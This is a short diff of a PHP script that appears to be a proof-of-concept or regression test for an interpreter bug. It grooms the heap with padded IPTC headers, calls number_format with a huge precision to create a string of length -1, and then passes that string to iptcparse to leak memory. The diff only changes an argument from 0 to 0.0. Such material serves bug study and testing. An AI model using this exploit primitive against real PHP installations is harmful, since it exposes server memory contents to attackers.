@@ -11,7 +11,7 @@ $holder = [];
 for($i = 0; $i < 100; $i++)
   $holder[] = str_pad($iptc_hdr, 96);
 // trigger bug to create string with len=-1
-$badstr = number_format(0,0x7fffffff);
+$badstr = number_format(0.0,0x7fffffff);
 var_dump($badstr);
 // leak memory :)
 $tmp = iptcparse($badstr);
